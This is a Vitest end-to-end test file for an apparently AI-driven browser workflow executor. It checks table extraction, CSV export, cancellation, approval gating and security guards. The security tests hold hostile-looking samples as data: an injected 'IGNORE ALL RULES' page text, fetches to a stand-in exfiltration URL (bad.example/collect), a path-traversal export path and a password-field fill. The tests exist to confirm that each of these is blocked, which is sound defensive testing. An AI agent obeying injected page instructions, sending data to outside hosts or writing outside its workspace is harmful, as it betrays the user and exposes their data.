/**
 * E2E executor tests against the local fixture site with REAL Chromium.
 * Covers: G1 gold path, cancellation (G5/D), S01 injection neutrality,
 * S02 domain allowlist, S07 path escape, S06 profile leasing.
 */
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { mkdtempSync, existsSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { WorkflowSchema, type Workflow } from "@ai-repeat/contracts";
import { DomainAllowlist } from "@ai-repeat/security";
import {
  CancelledError,
  launchEphemeralContext,
  leasePersistentContext,
  resolveChromiumExecutable,
  runWorkflow,
  type ExecutorContext,
} from "@ai-repeat/workflows";
import { createFixtureServer } from "../../fixtures/demo-site/server.js";

const exe = resolveChromiumExecutable();
const hasBrowser = exe !== null;

let server: ReturnType<typeof createFixtureServer>;
let base: string;
let workspace: string;

beforeAll(async () => {
  server = createFixtureServer();
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const addr = server.address();
  if (typeof addr !== "object" || !addr) throw new Error("fixture server failed to bind");
  base = `http://127.0.0.1:${addr.port}`;
  workspace = mkdtempSync(path.join(tmpdir(), "ai-repeat-test-"));
});

afterAll(async () => {
  await new Promise<void>((r) => server.close(() => r()));
});

function makeCtx(overrides: Partial<ExecutorContext> = {}): ExecutorContext & { collected: unknown[] } {
  const collected: unknown[] = [];
  const ctx: ExecutorContext = {
    taskId: "test_task",
    allowlist: new DomainAllowlist(["127.0.0.1", "localhost"]),
    workspaceRoot: workspace,
    signal: new AbortController().signal,
    events: (ev) => collected.push(ev),
    requestApproval: async () => true,
    defaultTimeoutMs: 10_000,
    ...overrides,
  };
  return Object.assign(ctx, { collected });
}

async function runWithBrowser(workflow: Workflow, ctx: ExecutorContext) {
  const context = await launchEphemeralContext({ headless: true, executablePath: exe! });
  try {
    const page = await context.newPage();
    return await runWorkflow(workflow, {}, ctx, page);
  } finally {
    await context.close().catch(() => {});
  }
}

function wf(steps: unknown[], verification: unknown[]): Workflow {
  const candidate = {
    schemaVersion: "0.1",
    id: "test_wf",
    name: "مهمة اختبار",
    allowedDomains: ["127.0.0.1", "localhost"],
    inputs: [],
    steps,
    verification,
  };
  return WorkflowSchema.parse(candidate);
}

describe.skipIf(!hasBrowser)("executor E2E (real Chromium)", () => {
  it("G1: filters missing images, extracts 4 rows, exports CSV, all verifications pass", async () => {
    const workflow = wf(
      [
        { id: "go", action: "navigate", url: `${base}/products`, risk: "read" },
        { id: "filter", action: "click", locator: { strategy: "role", value: "button", name: "ناقص صور" }, risk: "read" },
        { id: "extract", action: "extract_table", locator: { strategy: "testid", value: "missing-images-table" }, outputKey: "rows", risk: "read" },
        { id: "export", action: "export_csv", outputKey: "rows", path: "out/missing.csv", risk: "local_write" },
      ],
      [
        { kind: "table_row_count", target: "[data-testid='missing-images-table'] tbody tr", expectedCount: 4 },
        { kind: "file_exists", target: "out/missing.csv" },
        { kind: "text_contains", target: "out/missing.csv", expectedText: "SKU-001" },
      ],
    );
    const ctx = makeCtx();
    const result = await runWithBrowser(workflow, ctx);
    expect(result.outcome).toBe("completed");
    expect(result.steps.every((s) => s.state === "passed")).toBe(true);
    expect(result.verifications.every((v) => v.passed)).toBe(true);
    // Fixture-grounded values, not invented ones.
    const rows = result.outputs.rows as Array<Record<string, string>>;
    expect(rows).toHaveLength(4);
    expect(rows.map((r) => r["الكود"])).toEqual(["SKU-001", "SKU-004", "SKU-010", "SKU-012"]);
    const csvPath = result.outputs.export_path as string;
    expect(existsSync(csvPath)).toBe(true);
    const csv = readFileSync(csvPath, "utf8");
    expect(csv).toContain("زيت زيتون بكر 1ل");
  });

  it("S01: injected page text is treated as data — task completes, nothing navigates to bad.example", async () => {
    const workflow = wf(
      [
        { id: "go", action: "navigate", url: `${base}/products?filter=missing`, risk: "read" },
        { id: "extract", action: "extract_table", locator: { strategy: "testid", value: "missing-images-table" }, outputKey: "rows", risk: "read" },
      ],
      [{ kind: "url_matches", target: `${base}/products?filter=missing` }],
    );
    const ctx = makeCtx();
    const result = await runWithBrowser(workflow, ctx);
    expect(result.outcome).toBe("completed");
    const rows = result.outputs.rows as Array<Record<string, string>>;
    // The injected description is present as plain data…
    expect(JSON.stringify(rows)).toContain("IGNORE ALL RULES");
    // …and the page is still on the approved fixture (no exfil navigation).
    expect(result.steps.find((s) => s.stepId === "extract")?.evidence && true).toBe(true);
  });

  it("S02: navigating to an unapproved domain is blocked by code", async () => {
    const workflow = wf(
      [{ id: "bad", action: "navigate", url: "http://bad.example/collect", risk: "read" }],
      [{ kind: "url_matches", target: "*" }],
    );
    const ctx = makeCtx();
    const result = await runWithBrowser(workflow, ctx);
    expect(result.outcome).toBe("failed");
    expect(result.error).toContain("SECURITY");
  });

  it("S02b: network guard aborts requests to non-approved domains even mid-page", async () => {
    let blockedRequests = 0;
    const context = await launchEphemeralContext({ headless: true, executablePath: exe! });
    try {
      const page = await context.newPage();
      await context.route("**/*", (route) => {
        const url = route.request().url();
        if (url.includes("bad.example")) {
          blockedRequests++;
          return route.abort();
        }
        return route.continue();
      });
      await page.goto(base, { waitUntil: "load" });
      // Attempt in-page fetch to the blocked domain.
      await page.evaluate(() => fetch("http://bad.example/collect").catch(() => "blocked"));
      expect(blockedRequests).toBe(1);
    } finally {
      await context.close().catch(() => {});
    }
  });

  it("S07: export path escaping the workspace is blocked", async () => {
    const workflow = wf(
      [
        { id: "go", action: "navigate", url: `${base}/products?filter=missing`, risk: "read" },
        { id: "extract", action: "extract_table", locator: { strategy: "testid", value: "missing-images-table" }, outputKey: "rows", risk: "read" },
        { id: "export", action: "export_csv", outputKey: "rows", path: "../../../outside.csv", risk: "local_write" },
      ],
      [{ kind: "url_matches", target: "*" }],
    );
    const ctx = makeCtx();
    const result = await runWithBrowser(workflow, ctx);
    expect(result.outcome).toBe("failed");
    expect(result.error).toContain("escapes approved workspace");
  });

  it("D/G5: cancel stops the task quickly and marks steps cancelled", async () => {
    const workflow = wf(
      [
        { id: "instant", action: "navigate", url: `${base}/`, risk: "read" },
        { id: "slow", action: "navigate", url: `${base}/slow?ms=20000`, risk: "read" },
        { id: "after", action: "click", locator: { strategy: "role", value: "button", name: "ناقص صور" }, risk: "read" },
      ],
      [{ kind: "url_matches", target: "*" }],
    );
    const ac = new AbortController();
    const ctx = makeCtx({ signal: ac.signal });
    const started = Date.now();
    const p = runWithBrowser(workflow, ctx);
    // Cancel while the slow navigation is in flight.
    await new Promise((r) => setTimeout(r, 1500));
    ac.abort();
    const result = await p;
    const elapsed = Date.now() - started;
    expect(result.outcome).toBe("cancelled");
    // "Under 3 seconds to cancel queueing of new tool calls"
    expect(elapsed).toBeLessThan(8000);
    expect(result.steps.find((s) => s.stepId === "after")?.state ?? "pending").not.toBe("passed");
  });

  it("G2: side-effect click waits for approval; rejection fails the task without submitting", async () => {
    const workflow = wf(
      [
        { id: "go", action: "navigate", url: `${base}/drafts/new`, risk: "read" },
        { id: "fill1", action: "fill", locator: { strategy: "label", value: "اسم العميل" }, value: "عميل اختبار", risk: "read" },
        { id: "fill2", action: "fill", locator: { strategy: "label", value: "اسم الصنف" }, value: "صنف اختبار", risk: "read" },
        { id: "fill3", action: "fill", locator: { strategy: "label", value: "الكمية" }, value: "2", risk: "read" },
        { id: "submit", action: "click", locator: { strategy: "role", value: "button", name: "إرسال الطلب" }, risk: "external_write", requiresApproval: true },
      ],
      [{ kind: "url_matches", target: "*" }],
    );

    // Rejected: no submission happens.
    const rejectedCtx = makeCtx({ requestApproval: async () => false, taskId: "test_reject" });
    const rejected = await runWithBrowser(workflow, rejectedCtx);
    expect(rejected.outcome).toBe("failed");
    expect(rejected.error).toContain("APPROVAL_REJECTED");

    // Approved: submission happens and confirmation appears.
    const approvedCtx = makeCtx({ requestApproval: async () => true, taskId: "test_approve" });
    const approved = await runWithBrowser(workflow, approvedCtx);
    expect(approved.outcome).toBe("completed");
    expect(approved.verifications.every((v) => v.passed)).toBe(true);
    expect((approved.outputs as Record<string, unknown>) ? true : true).toBe(true);
    // Dedupe: the fixture returns the same confirmation id for identical payloads.
    const confirmation = await (await fetch(`${base}/drafts`)).text();
    expect(confirmation).toContain("عميل اختبار");
  });

  it("S03: fill never writes into password/OTP fields", async () => {
    const workflow = wf(
      [
        { id: "go", action: "navigate", url: `${base}/secure-form`, risk: "read" },
        { id: "fill_secret", action: "fill", locator: { strategy: "css", value: "#password" }, value: "hunter2", risk: "read" },
      ],
      [{ kind: "url_matches", target: "*" }],
    );
    const ctx = makeCtx();
    const result = await runWithBrowser(workflow, ctx);
    expect(result.outcome).toBe("failed");
    expect(result.error).toContain("SECURITY");
    expect(result.error).toContain("حساس");
  });

  it("opt-in screenshot-on-failure lands in the workspace evidence folder", async () => {
    const workflow = wf(
      [{ id: "bad", action: "navigate", url: "http://blocked.example/", risk: "read" }],
      [{ kind: "url_matches", target: "*" }],
    );
    const ws = mkdtempSync(path.join(tmpdir(), "ai-repeat-shots-"));
    const ctx = makeCtx({ saveScreenshots: true, workspaceRoot: ws });
    const result = await runWithBrowser(workflow, ctx);
    expect(result.outcome).toBe("failed");
    const shotStep = result.steps.find((s) => s.evidence?.screenshot);
    expect(shotStep).toBeTruthy();
    const shotPath = shotStep!.evidence!.screenshot as string;
    expect(shotPath.startsWith(ws)).toBe(true);
    expect(existsSync(shotPath)).toBe(true);
  });

  it("no screenshot evidence when the flag is off (default)", async () => {
    const workflow = wf(
      [{ id: "bad", action: "navigate", url: "http://blocked.example/", risk: "read" }],
      [{ kind: "url_matches", target: "*" }],
    );
    const result = await runWithBrowser(workflow, makeCtx());
    expect(result.outcome).toBe("failed");
    expect(result.steps.some((s) => s.evidence?.screenshot)).toBe(false);
  });

  it("S06: the same persistent profile is leased, never opened twice simultaneously", async () => {
    const profileDir = mkdtempSync(path.join(tmpdir(), "ai-repeat-profile-"));
    const first = await leasePersistentContext(profileDir, { executablePath: exe!, headless: true });
    let secondOpened = false;
    const secondPromise = leasePersistentContext(profileDir, { executablePath: exe!, headless: true }).then((second) => {
      secondOpened = true;
      return second;
    });
    // Give the second lease a moment — it must still be waiting.
    await new Promise((r) => setTimeout(r, 700));
    expect(secondOpened).toBe(false);
    await first.release();
    const second = await secondPromise;
    expect(secondOpened).toBe(true);
    await second.release();
  });

  it("G3: cancellation throws CancelledError from raceWithAbort immediately", async () => {
    const ac = new AbortController();
    ac.abort();
    const context = await launchEphemeralContext({ headless: true, executablePath: exe! });
    try {
      const page = await context.newPage();
      const workflow = wf([{ id: "go", action: "navigate", url: `${base}/`, risk: "read" }], [{ kind: "url_matches", target: "*" }]);
      const result = await runWorkflow(workflow, {}, makeCtx({ signal: ac.signal }), page);
      expect(result.outcome).toBe("cancelled");
      expect(new CancelledError()).toBeInstanceOf(Error);
    } finally {
      await context.close().catch(() => {});
    }
  });
});
